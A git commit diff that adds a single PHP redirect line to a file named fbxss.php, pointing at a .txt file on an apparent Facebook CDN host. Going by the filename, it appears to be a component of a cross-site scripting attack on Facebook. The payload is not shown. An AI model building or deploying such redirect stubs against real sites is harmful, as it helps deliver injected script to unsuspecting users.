94c654bdc08dfe139a6bc3955df501ced259dedb
missoum1307 <missoum1307@users.noreply.github.com>
2017-12-13 04:19:37 +0100

    Update fbxss.php

--- fbxss.php
+++ fbxss.php
@@ -1,1 +1,2 @@
 
+<?php header('Location: https://fb-s-b-a.akamaihd.net/h-ak-fbx/v/t39.2087-6/24293263_1391976140927796_1681729676365529088_n.txt?oh=4080eb2aed0df763386f6a155a5dc0da&oe=5ACDAD27&__gda__=1523728967_5c1ccf58178b8a19e5b8cdb1b10ecaee')?>
